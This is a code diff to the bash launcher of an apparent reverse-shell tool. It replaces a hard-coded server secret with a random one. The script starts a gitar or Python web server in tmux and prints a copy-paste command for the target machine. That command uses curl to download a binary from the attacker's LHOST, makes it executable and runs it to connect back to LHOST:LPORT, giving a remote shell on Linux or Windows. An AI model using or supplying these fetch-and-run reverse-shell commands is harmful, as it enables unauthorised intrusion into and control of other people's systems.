@@ -74,7 +74,8 @@ if [[ "$GITAR" ]]; then
     echo "[+] gitar shortcuts enabled on reverse shell"
     sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
     echo "[+] launch gitar server"
-    tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT} --secret tacos"
+    SECRET=$RANDOM
+    tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT} --secret ${SECRET}"
 else
     echo "[+] gitar shortcuts  not enabled"
     tmux split-window -h "python3 -m http.server ${WEBPORT}"
@@ -93,7 +94,7 @@ fi
 
 echo "[*] Copy/paste following command on target and enjoy your meal 🌮:"
 if [[ "$GITAR" ]]; then
-	echo "(🐧) curl -O ${LHOST}:${WEBPORT}/tacos/pull/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+	echo "(🐧) curl -O ${LHOST}:${WEBPORT}/${SECRET}/pull/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
 else
     echo
     echo "(🪟) curl -O ${LHOST}:${WEBPORT}/${BINARY} && .\\${BINARY} ${LHOST}:${LPORT}"
